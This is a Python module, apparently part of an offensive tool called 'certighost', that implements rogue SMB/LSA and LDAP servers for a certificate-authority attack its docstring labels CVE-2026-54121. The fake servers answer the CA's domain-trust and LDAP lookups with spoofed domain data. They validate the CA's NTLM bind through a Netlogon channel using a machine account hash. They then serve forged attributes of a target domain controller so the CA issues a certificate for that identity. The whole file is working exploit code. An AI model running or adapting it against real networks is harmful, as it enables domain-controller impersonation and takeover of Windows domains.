"""
Services module — rogue SMB/LSA and LDAP servers for CVE-2026-54121 chase mechanism.

Implements:
1. Rogue SMB server (port 445) with LSA named pipe for domain trust verification
2. Rogue LDAP server (port 389) with Netlogon-validated NTLM bind + ARC4 sealing
3. NLOracle — Netlogon secure channel for NTLM credential validation

When the CA receives a certificate request with cdc: attribute, it:
- Connects to attacker's port 445, opens \\pipe\\lsarpc for trust verification
- Connects to attacker's port 389, performs NTLM bind + sealed LDAP search
- Issues certificate with identity from our LDAP response
"""

import calendar
import logging
import os
import socket
import struct
import threading
import time
from binascii import unhexlify
from typing import Optional

from Crypto.Cipher import ARC4

from impacket import ntlm, smbserver, uuid
from impacket.dcerpc.v5 import epm, lsad, nrpc, rpcrt, transport
from impacket.dcerpc.v5.dtypes import RPC_SID
from impacket.dcerpc.v5.nrpc import checkNullString
from impacket.dcerpc.v5.rpcrt import DCERPCServer, RPC_C_AUTHN_LEVEL_PKT_PRIVACY

logger = logging.getLogger("certighost.services")


# ============================================================
# Impacket SMB server monkey-patch (ParameterControl 0x820 fix)
# ============================================================

def _patch_smb():
    """
    Patch impacket's smbserver to:
    1. Add setComputerAccount/getServer if missing (older impacket)
    2. Fix ParameterControl in NetLogon validation to accept server-trust accounts
       (0x800 | 0x20 = 0x820) — needed when CA is co-hosted on a DC
    """
    S = smbserver.SimpleSMBServer
    if not hasattr(S, "setComputerAccount"):
        def _sca(self, **kw):
            c = self._SimpleSMBServer__smbConfig
            c.set("global", "server_name", kw["computer_account_name"][:-1])
            c.set("global", "server_domain", kw["computer_account_domain"])
            for k in ("computer_account_name", "computer_account_hash",
                      "computer_account_aes", "computer_account_password",
                      "computer_account_domain"):
                c.set("global", k, kw.get(k, "") or "")
            c.set("global", "dcip", kw["dcip"])
            self._SimpleSMBServer__server.setServerConfig(c)
            self._SimpleSMBServer__server.processConfigFile()
        S.setComputerAccount = lambda self, **kw: _sca(self, **kw)
    if not hasattr(S, "getServer"):
        S.getServer = lambda self: self._SimpleSMBServer__server

    if hasattr(smbserver, "NetLogon"):
        _NL = smbserver.NetLogon

        def _fixed_logon(self, authenticateMessage, serverChallenge):
            request = nrpc.NetrLogonSamLogonWithFlags()
            request["LogonServer"] = "\x00"
            request["ComputerName"] = self.computer_name + "\x00"
            request["ValidationLevel"] = nrpc.NETLOGON_VALIDATION_INFO_CLASS.NetlogonValidationSamInfo4
            request["LogonLevel"] = nrpc.NETLOGON_LOGON_INFO_CLASS.NetlogonNetworkTransitiveInformation
            request["LogonInformation"]["tag"] = nrpc.NETLOGON_LOGON_INFO_CLASS.NetlogonNetworkTransitiveInformation
            ident = request["LogonInformation"]["LogonNetworkTransitive"]["Identity"]
            ident["LogonDomainName"] = authenticateMessage["domain_name"].decode("utf-16le")
            ident["ParameterControl"] = 0x800 | 0x20
            ident["UserName"] = authenticateMessage["user_name"].decode("utf-16le")
            ident["Workstation"] = ""
            logger.debug(
                f"SMB NetLogon: validating {ident['LogonDomainName']}\\{ident['UserName']} "
                f"(ParameterControl=0x{int(ident['ParameterControl']):x})"
            )
            request["LogonInformation"]["LogonNetworkTransitive"]["LmChallenge"] = serverChallenge
            request["LogonInformation"]["LogonNetworkTransitive"]["NtChallengeResponse"] = authenticateMessage["ntlm"]
            request["LogonInformation"]["LogonNetworkTransitive"]["LmChallengeResponse"] = authenticateMessage["lanman"]
            request["Authenticator"] = self.authenticator
            request["ReturnAuthenticator"]["Credential"] = b"\x00" * 8
            request["ReturnAuthenticator"]["Timestamp"] = 0
            request["ExtraFlags"] = 0
            resp = self.dce.request(request)
            logger.debug(f"SMB NetLogon: validation returned error_code={resp['ErrorCode']}")
            signingKey = ntlm.generateEncryptedSessionKey(
                resp["ValidationInformation"]["ValidationSam4"]["UserSessionKey"],
                authenticateMessage["session_key"])
            return signingKey, resp["ErrorCode"]

        _NL.logonUserAndGetSessionKey = _fixed_logon

_patch_smb()


# ============================================================
# LSA RPC Server (trust verification responder)
# ============================================================

class LSASrv(DCERPCServer):
    """
    Minimal LSA RPC server responding to LsarQueryInformationPolicy.
    Registered on \\PIPE\\lsarpc via the rogue SMB server.
    CA uses this to verify domain trust before issuing cdc-chased certs.
    """
    UUID = ("12345778-1234-ABCD-EF00-0123456789AB", "0.0")

    def __init__(self, netbios_name, dns_domain, forest, guid_le, domain_sid):
        DCERPCServer.__init__(self)
        self._handle = b"\x00" * 4 + b"LSA!" + b"\xde\xad\xbe\xef" * 2
        self._nb = netbios_name
        self._dns = dns_domain
        self._forest = forest
        self._guid = guid_le
        self._sid_str = domain_sid
        self.addCallbacks(
            self.UUID, "\\PIPE\\lsarpc",
            {0: self._close, 6: self._open_policy, 7: self._query_info,
             44: self._open_policy2, 46: self._query_info2,
             76: self._lookup_sids3, 130: self._lookup_sids3}
        )

    def _unicode_str(self, s):
        u = lsad.RPC_UNICODE_STRING()
        u["Data"] = s
        return u

    def _rpc_sid(self):
        s = RPC_SID()
        s.fromCanonical(self._sid_str)
        return s

    def _dns_domain_info(self):
        i = lsad.LSAPR_POLICY_DNS_DOMAIN_INFO()
        i["Name"] = self._unicode_str(self._nb)
        i["DnsDomainName"] = self._unicode_str(self._dns)
        i["DnsForestName"] = self._unicode_str(self._forest)
        i["DomainGuid"] = self._guid
        i["Sid"] = self._rpc_sid()
        return i

    def _close(self, data):
        r = lsad.LsarCloseResponse()
        r["PolicyHandle"] = b"\x00" * 20
        r["ErrorCode"] = 0
        return r.getData()

    def _open_policy(self, data):
        r = lsad.LsarOpenPolicyResponse()
        r["PolicyHandle"] = self._handle
        r["ErrorCode"] = 0
        return r.getData()

    def _open_policy2(self, data):
        r = lsad.LsarOpenPolicy2Response()
        r["PolicyHandle"] = self._handle
        r["ErrorCode"] = 0
        return r.getData()

    def _query_dispatch(self, data, response_class):
        try:
            req = lsad.LsarQueryInformationPolicy(data)
            level = int(req["InformationClass"])
        except Exception:
            level = 12

        r = response_class()
        info = lsad.LSAPR_POLICY_INFORMATION()

        if level in (12, 13):
            info["tag"] = level
            key = "PolicyDnsDomainInfo" if level == 12 else "PolicyDnsDomainInfoInt"
            info[key] = self._dns_domain_info()
        elif level in (5, 14):
            info["tag"] = level
            ai = lsad.LSAPR_POLICY_ACCOUNT_DOM_INFO()
            ai["DomainName"] = self._unicode_str(self._nb)
            ai["DomainSid"] = self._rpc_sid()
            key = "PolicyAccountDomainInfo" if level == 5 else "PolicyLocalAccountDomainInfo"
            info[key] = ai
        elif level == 3:
            info["tag"] = 3
            pi = lsad.LSAPR_POLICY_PRIMARY_DOM_INFO()
            pi["Name"] = self._unicode_str(self._nb)
            pi["Sid"] = self._rpc_sid()
            info["PolicyPrimaryDomainInfo"] = pi
        elif level == 6:
            info["tag"] = 6
            ri = lsad.POLICY_LSA_SERVER_ROLE_INFO()
            ri["LsaServerRole"] = 3
            info["PolicyServerRoleInfo"] = ri
        else:
            from impacket.dcerpc.v5.dtypes import NULL
            r["PolicyInformation"] = NULL
            r["ErrorCode"] = 0xC0000022
            return r.getData()

        r["PolicyInformation"] = info
        r["ErrorCode"] = 0
        return r.getData()

    def _query_info(self, data):
        return self._query_dispatch(data, lsad.LsarQueryInformationPolicyResponse)

    def _query_info2(self, data):
        return self._query_dispatch(data, lsad.LsarQueryInformationPolicy2Response)

    def _lookup_sids3(self, data):
        return b"\x00" * 20 + struct.pack("<I", 0xC0000073)


# ============================================================
# NLOracle — Netlogon secure channel for LDAP NTLM validation
# ============================================================

class NLOracle:
    """
    Establishes a Netlogon secure channel to the real DC and validates
    NTLM credentials presented by the CA during LDAP bind.
    """

    def __init__(self, dc_ip, computer_name, nt_hash_hex, domain):
        self.dc_ip = dc_ip
        self.computer_name = computer_name
        self.nt_hash = unhexlify(nt_hash_hex)
        self.domain = domain
        self.name = computer_name.rstrip("$")
        self.dce = None
        self.auth = None

    def setup(self):
        binding = epm.hept_map(
            self.dc_ip, nrpc.MSRPC_UUID_NRPC,
            dataRepresentation=rpcrt.DCERPC.NDRSyntax, protocol='ncacn_ip_tcp'
        )
        t = transport.DCERPCTransportFactory(binding)
        d = t.get_dce_rpc()
        d.connect()
        syn = uuid.bin_to_uuidtup(rpcrt.DCERPC.NDRSyntax)
        d.bind(nrpc.MSRPC_UUID_NRPC, transfer_syntax=syn)

        client_challenge = os.urandom(8)
        resp = nrpc.hNetrServerReqChallenge(d, "", self.name + "\x00", client_challenge)
        session_key = nrpc.ComputeSessionKeyStrongKey(
            None, client_challenge, resp["ServerChallenge"], self.nt_hash
        )
        credential = nrpc.ComputeNetlogonCredential(client_challenge, session_key)

        nrpc.hNetrServerAuthenticate3(
            d, "\x00", self.computer_name + "\x00",
            nrpc.NETLOGON_SECURE_CHANNEL_TYPE.WorkstationSecureChannel,
            self.name + "\x00", credential, 0x600FFFFF
        )

        d.set_credentials(self.computer_name, "", self.domain)
        d.set_auth_type(rpcrt.RPC_C_AUTHN_NETLOGON)
        d.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)
        d.bind(nrpc.MSRPC_UUID_NRPC, alter=1, transfer_syntax=syn)

        authenticator = nrpc.ComputeNetlogonAuthenticator(credential, session_key)
        d.set_session_key(session_key)
        resp = nrpc.hNetrLogonGetCapabilities(d, "", self.name, authenticator)
        self.auth = resp['ReturnAuthenticator']
        self.dce = d
        logger.debug("NLOracle: Netlogon secure channel established")

    def validate(self, ntlm_auth_blob, server_challenge):
        """Validate NTLM authenticate message via Netlogon. Returns (session_key, error_code, flags)."""
        am = ntlm.NTLMAuthChallengeResponse()
        am.fromString(ntlm_auth_blob)

        r = nrpc.NetrLogonSamLogonWithFlags()
        r["LogonServer"] = "\x00"
        r["ComputerName"] = self.name + "\x00"
        r["ValidationLevel"] = nrpc.NETLOGON_VALIDATION_INFO_CLASS.NetlogonValidationSamInfo4
        r["LogonLevel"] = nrpc.NETLOGON_LOGON_INFO_CLASS.NetlogonNetworkTransitiveInformation
        r["LogonInformation"]["tag"] = r["LogonLevel"]

        ident = r["LogonInformation"]["LogonNetworkTransitive"]["Identity"]
        ident["LogonDomainName"] = am["domain_name"].decode("utf-16le")
        ident["ParameterControl"] = 0x800 | 0x20
        ident["UserName"] = am["user_name"].decode("utf-16le")
        ident["Workstation"] = ""

        logger.debug(
            f"NLOracle: validating {ident['LogonDomainName']}\\{ident['UserName']} "
            f"(ParameterControl=0x{int(ident['ParameterControl']):x})"
        )

        r["LogonInformation"]["LogonNetworkTransitive"]["LmChallenge"] = server_challenge
        r["LogonInformation"]["LogonNetworkTransitive"]["NtChallengeResponse"] = am["ntlm"]
        r["LogonInformation"]["LogonNetworkTransitive"]["LmChallengeResponse"] = am["lanman"]
        r["Authenticator"] = self.auth
        r["ReturnAuthenticator"]["Credential"] = b"\x00" * 8
        r["ReturnAuthenticator"]["Timestamp"] = 0
        r["ExtraFlags"] = 0

        resp = self.dce.request(r)
        logger.debug(f"NLOracle: validation returned error_code={resp['ErrorCode']}")

        session_key = ntlm.generateEncryptedSessionKey(
            resp["ValidationInformation"]["ValidationSam4"]["UserSessionKey"],
            am["session_key"]
        )
        return session_key, resp["ErrorCode"], am["flags"]


# ============================================================
# Rogue SMB/LSA Server
# ============================================================

class RogueSMBLSA:
    """
    Rogue SMB server on port 445 with LSA named pipe.
    CA connects here to verify domain trust via LsarQueryInformationPolicy.
    """

    def __init__(self, netbios_name, dns_domain, forest, domain_guid_le,
                 domain_sid, computer_name, computer_hash, computer_password,
                 dc_ip, bind_address="0.0.0.0", port=445):
        self.netbios_name = netbios_name
        self.dns_domain = dns_domain
        self.forest = forest
        self.domain_guid_le = domain_guid_le
        self.domain_sid = domain_sid
        self.computer_name = computer_name
        self.computer_hash = computer_hash
        self.computer_password = computer_password
        self.dc_ip = dc_ip
        self.bind_address = bind_address
        self.port = port
        self._thread = None
        self._started = threading.Event()
        self._smb = None

    def start(self):
        if not hasattr(smbserver, "NetLogon"):
            logger.warning(
                "Impacket lacks smbserver.NetLogon — SMB Netlogon auth will fail. "
                "Update impacket to >= 0.12."
            )
        self._thread = threading.Thread(target=self._run, daemon=True, name="RogueSMB")
        self._thread.start()
        for _ in range(30):
            time.sleep(0.5)
            if self._started.is_set():
                break
        logger.info(f"RogueSMBLSA listening on {self.bind_address}:{self.port}")

    def stop(self):
        if self._smb:
            try:
                self._smb.getServer().shutdown()
                self._smb.getServer().server_close()
            except Exception:
                pass
            self._smb = None
        logger.info("RogueSMBLSA stopped")

    def _run(self):
        try:
            smb = smbserver.SimpleSMBServer(
                listenAddress=self.bind_address, listenPort=self.port
            )
            smb.setSMB2Support(True)
            smb.setLogFile("")
            smb.setComputerAccount(
                computer_account_name=self.computer_name,
                computer_account_hash=self.computer_hash,
                computer_account_aes="",
                computer_account_password=self.computer_password,
                computer_account_domain=self.dns_domain,
                dcip=self.dc_ip,
            )
            cfg = smb._SimpleSMBServer__smbConfig
            cfg.set("global", "server_os", "Windows Server 2022 Standard")
            smb.getServer().setServerConfig(cfg)
            smb.getServer().processConfigFile()

            lsa = LSASrv(
                self.netbios_name, self.dns_domain, self.forest,
                self.domain_guid_le, self.domain_sid
            )
            lsa_port = lsa.getListenPort()
            lsa_thread = threading.Thread(target=lsa.run, daemon=True, name="LSASrv")
            lsa_thread.start()
            time.sleep(0.3)

            smb.registerNamedPipe("lsarpc", ("127.0.0.1", lsa_port))
            self._smb = smb
            self._started.set()
            smb.start()
        except Exception as e:
            logger.error(f"RogueSMBLSA failed: {e}")
            self._started.set()


# ============================================================
# BER encoding/decoding primitives for LDAP
# ============================================================

def _ber_length(length: int) -> bytes:
    if length < 0x80:
        return bytes([length])
    out = b""
    n = length
    while n:
        out = bytes([n & 0xFF]) + out
        n >>= 8
    return bytes([0x80 | len(out)]) + out


def _ber_integer(n: int) -> bytes:
    if n == 0:
        return b"\x02\x01\x00"
    out = b""
    while n:
        out = bytes([n & 0xFF]) + out
        n >>= 8
    if out[0] & 0x80:
        out = b"\x00" + out
    return b"\x02" + _ber_length(len(out)) + out


def _ber_octet_string(d) -> bytes:
    if isinstance(d, str):
        d = d.encode()
    return b"\x04" + _ber_length(len(d)) + d


def _ber_sequence(i: bytes) -> bytes:
    return b"\x30" + _ber_length(len(i)) + i


def _ber_set(i: bytes) -> bytes:
    return b"\x31" + _ber_length(len(i)) + i


def _ber_enum(n: int) -> bytes:
    return b"\x0a\x01" + bytes([n])


def _ldap_message(mid: int, tag: int, payload: bytes) -> bytes:
    return _ber_sequence(_ber_integer(mid) + bytes([tag]) + _ber_length(len(payload)) + payload)


def _ldap_bind_response(mid: int, result_code: int = 0, creds: bytes = None) -> bytes:
    inner = _ber_enum(result_code) + _ber_octet_string("") + _ber_octet_string("")
    if creds:
        inner += b"\x87" + _ber_length(len(creds)) + creds
    return _ldap_message(mid, 0x61, inner)


def _ldap_search_entry(mid: int, dn: str, attrs: dict) -> bytes:
    attr_list = b""
    for k, vs in attrs.items():
        val_enc = b""
        for v in vs:
            val_enc += _ber_octet_string(v if isinstance(v, bytes) else v.encode())
        attr_list += _ber_sequence(_ber_octet_string(k) + _ber_set(val_enc))
    return _ldap_message(mid, 0x64, _ber_octet_string(dn) + _ber_sequence(attr_list))


def _ldap_search_done(mid: int, result_code: int = 0) -> bytes:
    return _ldap_message(mid, 0x65, _ber_enum(result_code) + _ber_octet_string("") + _ber_octet_string(""))


def _ber_decode_length(data: bytes, offset: int) -> tuple:
    first = data[offset]
    offset += 1
    if first < 0x80:
        return first, offset
    num_bytes = first & 0x7F
    length = 0
    for i in range(num_bytes):
        length = (length << 8) | data[offset + i]
    return length, offset + num_bytes


def _parse_ldap_header(data: bytes):
    """Parse LDAP message: returns (message_id, operation_tag, operation_data)."""
    _, offset = _ber_decode_length(data, 1)
    int_len, offset = _ber_decode_length(data, offset + 1)
    mid = int.from_bytes(data[offset:offset + int_len], "big")
    offset += int_len
    tag = data[offset]
    payload_len, offset = _ber_decode_length(data, offset + 1)
    return mid, tag, data[offset:offset + payload_len]


# ============================================================
# NTLM Challenge builder for LDAP
# ============================================================

def _build_ntlm_challenge(domain_netbios, domain_dns, host_netbios, host_dns, challenge_bytes):
    """Build a full NTLM challenge message with target info."""
    fl = (ntlm.NTLMSSP_NEGOTIATE_UNICODE | ntlm.NTLM_NEGOTIATE_OEM |
          ntlm.NTLMSSP_NEGOTIATE_NTLM | ntlm.NTLMSSP_NEGOTIATE_TARGET_INFO |
          ntlm.NTLMSSP_TARGET_TYPE_DOMAIN | ntlm.NTLMSSP_NEGOTIATE_VERSION |
          ntlm.NTLMSSP_NEGOTIATE_EXTENDED_SESSIONSECURITY |
          ntlm.NTLMSSP_REQUEST_TARGET | ntlm.NTLMSSP_NEGOTIATE_56 |
          ntlm.NTLMSSP_NEGOTIATE_128 | ntlm.NTLMSSP_NEGOTIATE_KEY_EXCH)

    c = ntlm.NTLMAuthChallenge()
    c["flags"] = fl
    c["challenge"] = challenge_bytes

    db = domain_netbios.encode("utf-16-le")
    c["domain_name"] = db
    c["domain_len"] = len(db)
    c["domain_max_len"] = len(db)
    c["domain_offset"] = 56

    av = ntlm.AV_PAIRS()
    av[ntlm.NTLMSSP_AV_DOMAINNAME] = domain_netbios.encode("utf-16-le")
    av[ntlm.NTLMSSP_AV_DNS_DOMAINNAME] = domain_dns.encode("utf-16-le")
    av[ntlm.NTLMSSP_AV_HOSTNAME] = host_netbios.encode("utf-16-le")
    av[ntlm.NTLMSSP_AV_DNS_HOSTNAME] = host_dns.encode("utf-16-le")
    av[ntlm.NTLMSSP_AV_TIME] = struct.pack(
        "<q", 116444736000000000 + calendar.timegm(time.gmtime()) * 10000000
    )
    c["TargetInfoFields"] = av
    c["TargetInfoFields_len"] = len(av)
    c["TargetInfoFields_max_len"] = len(av)
    c["TargetInfoFields_offset"] = 56 + len(db)
    c["Version"] = b"\x0a\x00\x00\x00\x00\x00\x00\x0f"
    c["VersionLen"] = 8

    return c.getData()


# ============================================================
# Connection state for sealed LDAP
# ============================================================

class _ConnState:
    def __init__(self):
        self.flags = 0
        self.server_sign_key = None
        self.client_encrypt = None
        self.server_encrypt = None
        self.seq_num = 0
        self.sealed = False
        self.challenge = b""

    def arm(self, session_key, flags):
        self.flags = flags
        self.server_sign_key = ntlm.SIGNKEY(flags, session_key, "Server")
        self.client_encrypt = ARC4.new(ntlm.SEALKEY(flags, session_key, "Client"))
        self.server_encrypt = ARC4.new(ntlm.SEALKEY(flags, session_key, "Server"))
        self.sealed = True


# ============================================================
# Rogue LDAP Server with Netlogon NTLM validation + ARC4 sealing
# ============================================================

class RogueLDAPServer:
    """
    Rogue LDAP server for CVE-2026-54121 chase mechanism.
    Handles SASL/NTLM bind validated via Netlogon, then serves sealed
    SearchResultEntry with target DC attributes.
    """

    def __init__(self, domain_dns, domain_netbios, computer_name, computer_hash,
                 computer_domain, dc_ip, target_sid_bin, target_dns,
                 target_cn, target_sam, port=389):
        self.domain_dns = domain_dns
        self.domain_netbios = domain_netbios
        self.dn = ",".join(f"DC={p}" for p in domain_dns.split("."))
        self.computer_name = computer_name
        self.computer_hash = computer_hash
        self.computer_domain = computer_domain
        self.dc_ip = dc_ip
        self.target_sid = target_sid_bin
        self.target_dns = target_dns
        self.target_cn = target_cn
        self.target_sam = target_sam
        self.port = port
        self._host_nb = computer_name.rstrip("$")
        self._host_dns = f"{self._host_nb}.{domain_dns}"
        self._thread: Optional[threading.Thread] = None
        self._running = False
        self._socket: Optional[socket.socket] = None
        self._chase_received = threading.Event()

    @property
    def chase_received(self) -> bool:
        return self._chase_received.is_set()

    def wait_for_chase(self, timeout: float = 30.0) -> bool:
        return self._chase_received.wait(timeout=timeout)

    def start(self):
        self._running = True
        self._chase_received.clear()
        self._thread = threading.Thread(target=self._serve, daemon=True, name="RogueLDAP")
        self._thread.start()
        logger.info(f"RogueLDAPServer listening on 0.0.0.0:{self.port}")

    def stop(self):
        self._running = False
        if self._socket:
            try:
                self._socket.close()
            except Exception:
                pass
        if self._thread:
            self._thread.join(timeout=5)
        logger.info("RogueLDAPServer stopped")

    def _rootdse(self):
        return {
            "defaultNamingContext": [self.dn],
            "rootDomainNamingContext": [self.dn],
            "configurationNamingContext": [f"CN=Configuration,{self.dn}"],
            "schemaNamingContext": [f"CN=Schema,CN=Configuration,{self.dn}"],
            "namingContexts": [self.dn, f"CN=Configuration,{self.dn}",
                               f"CN=Schema,CN=Configuration,{self.dn}"],
            "dnsHostName": [self._host_dns],
            "ldapServiceName": [f"{self.domain_dns}:{self._host_nb.lower()}$@{self.domain_dns.upper()}"],
            "supportedSASLMechanisms": ["GSSAPI", "GSS-SPNEGO", "EXTERNAL", "DIGEST-MD5"],
            "supportedLDAPVersion": ["3", "2"],
            "supportedCapabilities": [
                "1.2.840.113556.1.4.800", "1.2.840.113556.1.4.1670",
                "1.2.840.113556.1.4.1791", "1.2.840.113556.1.4.1935",
            ],
            "domainFunctionality": ["7"],
            "forestFunctionality": ["7"],
            "domainControllerFunctionality": ["7"],
        }

    def _principal_attrs(self, sam):
        return {
            "objectClass": ["top", "person", "organizationalPerson", "user", "computer"],
            "cn": [self.target_cn or sam.rstrip("$")],
            "sAMAccountName": [self.target_sam or sam],
            "objectSid": [self.target_sid],
            "objectGUID": [b"\x00" * 16],
            "userAccountControl": ["66048"],
            "objectCategory": [f"CN=Computer,CN=Schema,CN=Configuration,{self.dn}"],
            "dNSHostName": [self.target_dns],
            "servicePrincipalName": [
                f"HOST/{self.target_dns}",
                f"HOST/{self.target_cn or self._host_nb}",
            ],
        }

    def _seal_response(self, state, pdu):
        sealed, sig = ntlm.SEAL(
            state.flags, state.server_sign_key, b"", pdu, pdu,
            state.seq_num, state.server_encrypt.encrypt
        )
        state.seq_num += 1
        frame = sig.getData() + sealed
        return struct.pack(">I", len(frame)) + frame

    def _send(self, conn, state, data, do_seal):
        if do_seal and state.sealed:
            conn.send(self._seal_response(state, data))
        else:
            conn.send(data)

    def _handle_bind(self, conn, state, mid, op_data, sealed_response):
        offset = 0
        if op_data[offset] != 0x02:
            return
        vl, offset = _ber_decode_length(op_data, offset + 1)
        offset += vl
        offset += 1
        nl, offset = _ber_decode_length(op_data, offset)
        offset += nl

        auth_tag = op_data[offset]
        if auth_tag == 0xa3:
            offset += 1
            sl, offset = _ber_decode_length(op_data, offset)
            if op_data[offset] != 0x04:
                return
            ml, offset = _ber_decode_length(op_data, offset + 1)
            mech = op_data[offset:offset + ml].decode("utf-8", errors="replace")
            offset += ml

            creds = b""
            if offset < len(op_data) and op_data[offset] == 0x04:
                cl, offset = _ber_decode_length(op_data, offset + 1)
                creds = op_data[offset:offset + cl]

            if mech in ("GSS-SPNEGO", "GSSAPI") and creds.startswith(b"NTLMSSP\x00") and len(creds) >= 12:
                msg_type = int.from_bytes(creds[8:12], "little")
                if msg_type == 1:
                    state.challenge = os.urandom(8)
                    challenge_msg = _build_ntlm_challenge(
                        self.domain_netbios, self.domain_dns,
                        self._host_nb, self._host_dns, state.challenge
                    )
                    logger.info("LDAP: NTLM NEGOTIATE -> sending CHALLENGE")
                    self._send(conn, state, _ldap_bind_response(mid, 14, challenge_msg), sealed_response)
                    return
                if msg_type == 3:
                    logger.info("LDAP: NTLM AUTH -> validating via Netlogon")
                    nlo = NLOracle(self.dc_ip, self.computer_name, self.computer_hash, self.computer_domain)
                    try:
                        nlo.setup()
                        sk, err, fl = nlo.validate(creds, state.challenge)
                    except Exception as e:
                        logger.error(f"LDAP: Netlogon validation failed: {e}")
                        self._send(conn, state, _ldap_bind_response(mid, 49), sealed_response)
                        return
                    if err != 0:
                        logger.warning(f"LDAP: Netlogon rejected bind (error={err})")
                        self._send(conn, state, _ldap_bind_response(mid, 49), sealed_response)
                        return
                    state.arm(sk, fl)
                    logger.info("LDAP: NTLM bind SUCCESS (sealed channel established)")
                    self._send(conn, state, _ldap_bind_response(mid, 0), sealed_response)
                    return

        self._send(conn, state, _ldap_bind_response(mid, 0), sealed_response)

    def _handle_search(self, conn, state, mid, op_data, sealed_response):
        self._chase_received.set()
        offset = 0
        if op_data[offset] != 0x04:
            return
        dl, offset = _ber_decode_length(op_data, offset + 1)
        base_dn = op_data[offset:offset + dl].decode("utf-8", errors="replace")

        if base_dn == "":
            logger.debug("LDAP: RootDSE query -> returning rootDSE")
            self._send(conn, state, _ldap_search_entry(mid, "", self._rootdse()), sealed_response)
            self._send(conn, state, _ldap_search_done(mid, 0), sealed_response)
            return

        sam = self.target_sam or "X$"
        first_rdn = base_dn.split(",")[0]
        if "=" in first_rdn:
            cn_val = first_rdn.split("=", 1)[1]
            sam = cn_val if cn_val.endswith("$") else cn_val + "$"

        logger.info(f"LDAP: SearchRequest base={base_dn} -> returning target DC attributes")
        self._send(conn, state, _ldap_search_entry(mid, base_dn, self._principal_attrs(sam)), sealed_response)
        self._send(conn, state, _ldap_search_done(mid, 0), sealed_response)

    def _dispatch(self, conn, state, msg, sealed_response):
        mid, tag, op_data = _parse_ldap_header(msg)
        if tag == 0x60:
            self._handle_bind(conn, state, mid, op_data, sealed_response)
        elif tag == 0x63:
            self._handle_search(conn, state, mid, op_data, sealed_response)

    def _handle_client(self, conn):
        conn.settimeout(30)
        state = _ConnState()
        buf = b""
        try:
            while True:
                chunk = conn.recv(8192)
                if not chunk:
                    break
                buf += chunk
                while buf:
                    if not state.sealed:
                        if not buf or buf[0] != 0x30 or len(buf) < 2:
                            break
                        msg_len, offset = _ber_decode_length(buf, 1)
                        total = offset + msg_len
                        if len(buf) < total:
                            break
                        self._dispatch(conn, state, buf[:total], False)
                        buf = buf[total:]
                    else:
                        if len(buf) < 4:
                            break
                        frame_len = struct.unpack(">I", buf[:4])[0]
                        if len(buf) < 4 + frame_len:
                            break
                        framed = buf[4:4 + frame_len]
                        buf = buf[4 + frame_len:]
                        plain = state.client_encrypt.encrypt(framed[16:])
                        pos = 0
                        while pos < len(plain):
                            if plain[pos] != 0x30:
                                break
                            sl, so = _ber_decode_length(plain, pos + 1)
                            total_msg = so + sl
                            if pos + total_msg > len(plain):
                                break
                            self._dispatch(conn, state, plain[pos:pos + total_msg], True)
                            pos += total_msg
        except Exception as e:
            logger.debug(f"LDAP client handler: {e}")
        finally:
            try:
                conn.close()
            except Exception:
                pass

    def _serve(self):
        self._socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self._socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self._socket.bind(("0.0.0.0", self.port))
        self._socket.listen(8)
        self._socket.settimeout(1.0)

        while self._running:
            try:
                conn, addr = self._socket.accept()
                logger.info(f"LDAP connection from {addr[0]}:{addr[1]}")
                threading.Thread(
                    target=self._handle_client, args=(conn,), daemon=True
                ).start()
            except socket.timeout:
                continue
            except OSError:
                if self._running:
                    raise
                break


# ============================================================
# Service Manager
# ============================================================

class ServiceManager:
    """Manages lifecycle of both rogue servers for chase mechanism."""

    def __init__(self, domain_dns, domain_netbios, domain_sid, domain_guid_hex,
                 computer_name, computer_hash, computer_password, dc_ip,
                 target_sid_bin, target_dns, target_cn, target_sam,
                 ldap_port=389, smb_port=445):
        self.domain_dns = domain_dns
        self.domain_netbios = domain_netbios

        guid_le = self._guid_str_to_wire(domain_guid_hex) if domain_guid_hex else b"\x00" * 16

        self.smb_server = RogueSMBLSA(
            netbios_name=domain_netbios,
            dns_domain=domain_dns,
            forest=domain_dns,
            domain_guid_le=guid_le,
            domain_sid=domain_sid,
            computer_name=computer_name,
            computer_hash=computer_hash,
            computer_password=computer_password,
            dc_ip=dc_ip,
            port=smb_port,
        )

        self.ldap_server = RogueLDAPServer(
            domain_dns=domain_dns,
            domain_netbios=domain_netbios,
            computer_name=computer_name,
            computer_hash=computer_hash,
            computer_domain=domain_dns,
            dc_ip=dc_ip,
            target_sid_bin=target_sid_bin,
            target_dns=target_dns,
            target_cn=target_cn,
            target_sam=target_sam,
            port=ldap_port,
        )

    @staticmethod
    def _guid_str_to_wire(hex_str):
        raw = bytes.fromhex(hex_str)
        if len(raw) != 16:
            return raw
        import struct
        d1, d2, d3 = struct.unpack_from(">IHH", raw, 0)
        return struct.pack("<IHH", d1, d2, d3) + raw[8:]

    def start(self):
        self.smb_server.start()
        self.ldap_server.start()
        logger.info("Rogue services started (SMB:445 + LDAP:389)")

    def stop(self):
        self.ldap_server.stop()
        self.smb_server.stop()
        logger.info("Rogue services stopped")

    @property
    def chase_received(self) -> bool:
        return self.ldap_server.chase_received

    def wait_for_chase(self, timeout: float = 30.0) -> bool:
        return self.ldap_server.wait_for_chase(timeout)
